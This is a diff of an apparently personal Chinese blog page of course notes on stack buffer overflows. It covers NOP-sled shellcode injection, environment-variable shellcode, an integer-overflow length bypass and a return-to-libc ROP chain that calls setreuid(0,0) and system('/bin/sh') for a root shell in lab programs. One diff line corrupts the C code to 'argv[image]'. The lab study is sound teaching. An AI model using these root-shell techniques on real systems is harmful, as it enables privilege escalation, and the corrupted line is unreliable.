@@ -7,11 +7,11 @@
     <meta name="robots" content="noodp" />
     <title>漏洞分析：缓冲区溢出 - xfarawayx&#39;s Blog</title><meta name="author" content="">
 <meta name="author-link" content="">
-<meta name="description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。" /><meta name="keywords" content='信息安全, Article' /><meta itemprop="name" content="漏洞分析：缓冲区溢出">
+<meta name="description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。" /><meta name="keywords" content='信息安全, 笔记' /><meta itemprop="name" content="漏洞分析：缓冲区溢出">
 <meta itemprop="description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。"><meta itemprop="datePublished" content="2023-08-04T14:24:08+08:00" />
 <meta itemprop="dateModified" content="2023-08-04T14:24:08+08:00" />
 <meta itemprop="wordCount" content="3715">
-<meta itemprop="keywords" content="信息安全,Article," /><meta property="og:title" content="漏洞分析：缓冲区溢出" />
+<meta itemprop="keywords" content="信息安全,笔记," /><meta property="og:title" content="漏洞分析：缓冲区溢出" />
 <meta property="og:description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://example.org/posts/vul1/" /><meta property="article:section" content="posts" />
@@ -21,7 +21,9 @@
 <meta name="twitter:title" content="漏洞分析：缓冲区溢出"/>
 <meta name="twitter:description" content="本文浅谈《漏洞分析》课程中几个常见的栈溢出相关的题型。"/>
 <meta name="application-name" content="FixIt">
-<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/gurimon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://example.org/posts/vul1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://example.org/posts/vul1/" /><link rel="next" href="http://example.org/posts/crossmodel/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
   {
     "@context": "http://schema.org",
     "@type": "BlogPosting",
@@ -30,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http:\/\/example.org\/posts\/vul1\/"
-    },"genre": "posts","keywords": "信息安全, Article","wordcount":  3715 ,
+    },"genre": "posts","keywords": "信息安全, 笔记","wordcount":  3715 ,
     "url": "http:\/\/example.org\/posts\/vul1\/","datePublished": "2023-08-04T14:24:08+08:00","dateModified": "2023-08-04T14:24:08+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -39,7 +41,7 @@
       },"description": ""
   }
   </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="wide"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
       <a href="/" title="xfarawayx&#39;s Blog"><span class="header-title-text">xfarawayx&#39;s Blog</span></a><span class="header-subtitle"></span></div>
@@ -113,7 +115,7 @@
     <div class="header"><h1 class="single-title animate__animated animate__flipInX">
         <span>漏洞分析：缓冲区溢出</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><a href="https://xfarawayx.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d=" srcset="https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d=, https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d= 1.5x, https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d= 2x" sizes="auto" data-title="xfarawayx" data-alt="xfarawayx" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;xfarawayx</a></span>
+      <div class="post-meta-line"><span class="post-author"><a href="https://xfarawayx.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d=" srcset="https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d= 1x, https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d= 1.5x, https://www.gravatar.com/avatar/304ac3a0123f0360be6efe5e2feaf4d7?s=32&amp;d= 1.5x" sizes="auto" data-title="xfarawayx" data-alt="xfarawayx" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;xfarawayx</a></span>
           <span class="post-category">收录于 <a href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 专业课</a></span></div>
       <div class="post-meta-line"><span title="发布于 2023-08-04 14:24:08"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-08-04">2023-08-04</time></span>&nbsp;<span title="更新于 2023-08-04 14:24:08"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-08-04">2023-08-04</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3715 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
@@ -145,11 +147,11 @@
 <h2 id="1-栈帧结构与函数调用过程">1. 栈帧结构与函数调用过程</h2>
 <p>在介绍栈溢出前，我们有必要了解一下栈帧的结构与函数调用与返回的这两个重要的过程。</p>
 <p>每个运行的函数都会在栈上分配一段独立的区域，即为栈帧（Stack Frame）。栈帧存放了函数的返回地址和参数、临时变量、变量函数调用的上下文等。<strong>栈由高地址向低地址延申</strong>。栈指针 sp 指向栈底，存放在寄存器 ebp；帧指针 fp 指向栈顶，存放在寄存器 esp。具体栈帧结构和函数调用、返回的过程如下：</p>
-<p><img loading="lazy" src="/001/01.png" srcset="/001/01.png, /001/01.png 1.5x, /001/01.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/01.png" srcset="/001/01.png 1x, /001/01.png 1.5x, /001/01.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>在调用函数前，程序<strong>会先将函数的参数逐一压栈</strong>，然后执行 call：call 语句会<strong>先将返回地址压栈</strong>（返回地址即被调用函数运行结束后跳转到的地址），然后 jmp 到被调用函数。之后程序回味被调用的函数开辟一个新的栈帧，创建栈帧过程如上图所示。</p>
 <p>在被调用函数运行完毕后，程序会执行返回操作，释放开辟的栈帧，过程如上图所示。在执行完毕后，程序会<strong>跳转到返回地址</strong>。</p>
 <p>注：下图与上图栈的顺序不太一样</p>
-<p><img loading="lazy" src="/001/02.jpg" srcset="/001/02.jpg, /001/02.jpg 1.5x, /001/02.jpg 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/02.jpg" srcset="/001/02.jpg 1x, /001/02.jpg 1.5x, /001/02.jpg 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="2-栈溢出攻击基本原理">2. 栈溢出攻击基本原理</h2>
 <p>由前文可知，栈是<strong>由高地址向低地址延申</strong>的，这意味着在不开启堆栈保护的前提下，我们被调用函数的栈帧的地址是在返回地址之上的。</p>
 <p>众所周知，函数内的局部变量都是定义在栈帧中的。例如如下一个人畜无害的字符数组，栈帧会给它开辟一个233个字节的内存空间：</p>
@@ -223,13 +225,13 @@
 </span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Returned Properly</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>使用 GDB 对该漏洞程序进行反汇编：</p>
-<p><img loading="lazy" src="/001/03.png" srcset="/001/03.png, /001/03.png 1.5x, /001/03.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/03.png" srcset="/001/03.png 1x, /001/03.png 1.5x, /001/03.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>在这里可以看到执行完 bof 函数后的地址为 0x080404ff，即为 bof 函数的返回地址。</p>
 <p>对 bof 函数进行反汇编：</p>
-<p><img loading="lazy" src="/001/04.png" srcset="/001/04.png, /001/04.png 1.5x, /001/04.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/04.png" srcset="/001/04.png 1x, /001/04.png 1.5x, /001/04.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>向 Badfile 中写入数据 AAAA，以便后续观察 buffer 在栈中的位置（图略）；</p>
 <p>然后使用 GDB 在 bof 函数的 leave 处（0x080484a1）处设置断点，并查看栈内元素：</p>
-<p><img loading="lazy" src="/001/06.png" srcset="/001/06.png, /001/06.png 1.5x, /001/06.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/06.png" srcset="/001/06.png 1x, /001/06.png 1.5x, /001/06.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>可以发现buffer的起始地址与返回地址 0x080404ff 中间相隔 9*4=36 个字节。</p>
 <p>接下来我们需要让 buffer 溢出，并在原来存放返回地址的位置写入恶意代码的地址。</p>
 <p>由于在 GDB 中运行得到的 bof 函数的栈帧地址可能与直接运行时不同。我们可以通过填充 NOP 指令为恶意代码创建大量入口点。使用 NOP 填充使得我们不需要精确预测恶意代码被存放的地址，而只要保证写入的地址能藉由NOP“滑到”恶意代码。</p>
@@ -265,7 +267,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">File</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div><p>首先向字符串填充 NOP，然后在最末端插入提权 shellcode。由前面可知，我们需要先填充 36 个字节到达返回地址，并将返回地址修改为能到达恶意代码的入口地址即可。
 这里写入的地址ret比较随意，只要保证在NOP的区间内即可，可选地址区间很大。</p>
 <p>运行 exploit.py 生成攻击缓冲区的字符串 badfile，然后运行程序 stack。</p>
-<p><img loading="lazy" src="/001/07.png" srcset="/001/07.png, /001/07.png 1.5x, /001/07.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/07.png" srcset="/001/07.png 1x, /001/07.png 1.5x, /001/07.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>可以看到攻击成功。</p>
 <h3 id="42-将提权-shell-插入环境变量">4.2 将提权 shell 插入环境变量</h3>
 <p>我们可以先将写好的 shell 放在环境变量中，然后通过程序得到环境变量的地址。我们直接将返回地址覆盖为该环境变量的地址即可。</p>
@@ -329,7 +331,7 @@ execve(&#34;/bin//sh&#34;, [&#34;/bin//sh&#34;], NULL)
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[</span><span class="n">image</span><span class="p">])</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Usage Error:   </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
@@ -340,11 +342,11 @@ execve(&#34;/bin//sh&#34;, [&#34;/bin//sh&#34;], NULL)
 </span></span><span class="line"><span class="cl"> 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>首先按上面的方法，创建root shell的环境变量，并得到其地址为0xbffff293</p>
-<p><img loading="lazy" src="/001/08.png" srcset="/001/08.png, /001/08.png 1.5x, /001/08.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/08.png" srcset="/001/08.png 1x, /001/08.png 1.5x, /001/08.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>用与上题相同的方法，通过 gdb 得到字符数组与返回地址间差24个字节。</p>
-<p><img loading="lazy" src="/001/09.png" srcset="/001/09.png, /001/09.png 1.5x, /001/09.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/09.png" srcset="/001/09.png 1x, /001/09.png 1.5x, /001/09.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>注意到程序中有对输入字符串的长度进行判断的语句。此时就要利用前文提到的整数溢出：unsigned char 的范围为 [0,255]，只需要使其溢出超过 255 后的值落在条件区间即可。一种简单的方式为在返回地址后补无关字符。</p>
-<p><img loading="lazy" src="/001/10.png" srcset="/001/10.png, /001/10.png 1.5x, /001/10.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/10.png" srcset="/001/10.png 1x, /001/10.png 1.5x, /001/10.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>这里在覆盖返回地址后补了 236 个 A，使得字符串总长为 24+4+236=264，溢出后为 264-256=8，正好符合条件。可以看到成功得到了 root shell。</p>
 <h2 id="5-不可执行栈return-to-libc">5. 不可执行栈：Return-to-Libc</h2>
 <p>当开启可执行栈时，我们可以使程序跳转执行提权 shell，但关闭可执行栈后我们就无法这么做了。这时候我们可以通过 ROP（返回导向编程）实现攻击。</p>
@@ -384,27 +386,27 @@ execve(&#34;/bin//sh&#34;, [&#34;/bin//sh&#34;], NULL)
 </span></span><span class="line"><span class="cl"><span class="n">setreuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span></span></code></pre></div><p>首先老办法：向 badfile 中输入 AAAA，使用 GDB 在 bof 函数的 leave 处设断点，查看栈内元素：</p>
-<p><img loading="lazy" src="/001/11.png" srcset="/001/11.png, /001/11.png 1.5x, /001/11.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/11.png" srcset="/001/11.png 1x, /001/11.png 1.5x, /001/11.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>可以看到buffer首地址到返回地址之间的距离为 $41\times 4+2=166$ 个字节。接下来考虑解决题目的要求。</p>
 <p>首先需要介绍构造 ROP 链的相关原理。在前面我们已经知道函数被调用的过程：先将参数压栈，再将返回地址压栈，然后开辟新的栈帧。故设函数入口地址为 $x$，则返回地址为 $x+4$，第一个参数地址则为 $x+8$。</p>
 <p>我们尝试构造这样一个 ROP 链，使得程序能够连续执行给定的四个函数。</p>
 <p>构造的ROP链在栈中存放形式大致如下：</p>
-<p><img loading="lazy" src="/001/12.png" srcset="/001/12.png, /001/12.png 1.5x, /001/12.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/12.png" srcset="/001/12.png 1x, /001/12.png 1.5x, /001/12.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>这里的 x 即为原函数（bof）返回地址的位置。可以看到 system 的参数存放在 x+8 的位置。</p>
 <p>我们需要在程序中找一个 pop-ret 的片段作为 rop 链函数的返回地址。例如在第一个 system() 执行完毕后 ret，会弹出 x+4 并跳转其存放的地址，即 pop-ret 的片段。首先执行 pop 弹出 system 的参数，然后执行 ret，跳转到 x+12 存放的地址，即执行 setreuid()。</p>
 <p>使用 <code>objdump –d</code> 命令反汇编漏洞程序，查看程序完整的汇编代码，从中找 pop,ret 片段。</p>
-<p><img loading="lazy" src="/001/13.png" srcset="/001/13.png, /001/13.png 1.5x, /001/13.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/13.png" srcset="/001/13.png 1x, /001/13.png 1.5x, /001/13.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>如图，可以使用 0x804856f 作为 pop,ret 弹出一个参数后返回，使用 0x804856e 作为 pop,pop,ret 弹出两个参数后返回。</p>
 <p>定义需要的字符串的环境变量并得到其地址：</p>
-<p><img loading="lazy" src="/001/14.png" srcset="/001/14.png, /001/14.png 1.5x, /001/14.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/14.png" srcset="/001/14.png 1x, /001/14.png 1.5x, /001/14.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>并使用 GDB 得到需要的 libc 函数的地址：</p>
-<p><img loading="lazy" src="/001/15.png" srcset="/001/15.png, /001/15.png 1.5x, /001/15.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/15.png" srcset="/001/15.png 1x, /001/15.png 1.5x, /001/15.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>使用以下程序生成 badfile：</p>
